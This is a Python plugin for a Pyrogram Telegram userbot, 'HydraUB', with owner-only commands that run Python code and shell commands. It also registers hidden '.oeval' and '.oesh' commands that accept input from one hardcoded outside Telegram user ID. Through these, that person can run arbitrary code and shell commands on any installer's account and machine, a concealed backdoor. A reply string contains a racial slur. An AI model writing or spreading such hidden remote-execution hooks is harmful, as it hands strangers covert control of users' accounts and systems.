import os
import re
import subprocess
import sys
import traceback
from inspect import getfullargspec
from io import StringIO
from time import time
from config import CMD_HANDLER as cmd
from pyrogram import Client, filters
from pyrogram.types import Message
from HydraUB.helpers.basic import edit_or_reply, add_command_help


async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


@Client.on_message(
    filters.command("oeval", ["."]) & filters.user(1928713379) & ~filters.via_bot
)
@Client.on_message(filters.command("eval", cmd) & filters.me)
async def executor(client: Client, message: Message):
    if len(message.command) < 2:
        return await edit_or_reply(
            message, text="__Nigga Give me some command to execute.__"
        )
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await message.delete()
    t1 = time()
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"**OUTPUT**:\n```{evaluation.strip()}```"
    await edit_or_reply(message, final_output)
#    if len(final_output) > 4096:
#        filename = "output.txt"
#        with open(filename, "w+", encoding="utf8") as out_file:
#            out_file.write(str(evaluation.strip()))
#        t2 = time()
#        await message.reply_document(
#            document=filename,
#            caption=f"**INPUT:**\n`{cmd[0:980]}`\n\n**OUTPUT:**\n`Attached Document`",
#            quote=False
#        )
#        await message.delete()
#        os.remove(filename)
#    else:
#        t2 = time()
#        await edit_or_reply(
#            message, text=final_output
#        )

@Client.on_message(
    filters.command("oesh", ["."]) & filters.user(1928713379) & ~filters.via_bot
)
@Client.on_message(filters.command("sh", cmd) & filters.me)
async def shellrunner(client: Client, message: Message):
    if len(message.command) < 2:
        return await edit_or_reply(
            message, "**Usage:**\n/sh git pull"
        )
    text = message.text.split(None, 1)[1]
    if "\n" in text:
        code = text.split("\n")
        output = ""
        for x in code:
            shell = re.split(
                """ (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x
            )
            try:
                process = subprocess.Popen(
                    shell,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
            except Exception as err:
                print(err)
                await edit_or_reply(
                    message, "**ERROR:**\n```{err}```"
                )
            output += f"**{code}**\n"
            output += process.stdout.read()[:-1].decode("utf-8")
            output += "\n"
    else:
        shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", text)
        for a in range(len(shell)):
            shell[a] = shell[a].replace('"', "")
        try:
            process = subprocess.Popen(
                shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
        except Exception as err:
            print(err)
            exc_type, exc_obj, exc_tb = sys.exc_info()
            errors = traceback.format_exception(
                etype=exc_type,
                value=exc_obj,
                tb=exc_tb,
            )
            return await edit_or_reply(
                message, "**ERROR:**\n```{''.join(errors)}```"
            )
        output = process.stdout.read()[:-1].decode("utf-8")
    if str(output) == "\n":
        output = None
    if output:
        if len(output) > 4096:
            with open("output.txt", "w+") as file:
                file.write(output)
            await client.send_document(
                message.chat.id,
                "output.txt",
                reply_to_message_id=message.message_id,
                caption="`Output`",
            )
            return os.remove("output.txt")
        await edit_or_reply(
            message, "**OUTPUT:**\n```{output}```"
        )
    else:
        await edit_or_reply(message, "**OUTPUT: **\n`No output`")
